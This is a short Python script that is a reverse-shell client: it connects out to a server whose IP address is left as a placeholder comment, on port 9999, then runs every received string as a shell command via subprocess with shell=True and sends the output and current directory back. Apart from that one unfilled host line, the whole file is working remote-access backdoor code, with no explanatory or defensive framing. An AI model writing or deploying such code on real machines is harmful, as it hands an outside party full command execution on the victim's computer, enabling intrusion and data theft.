import socket
import os
import subprocess

s = socket.socket()
host = # ADD SERVER IP ADDRESS HERE
port = 9999

s.connect((host, port))

while True:
    data = s.recv(32768)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        byte_output = cmd.stdout.read() + cmd.stderr.read()
        str_out = str(byte_output, 'utf-8')
        current_working_dir = os.getcwd() + "> "
        s.send(str.encode(current_working_dir + str_out))
        print(str_out)
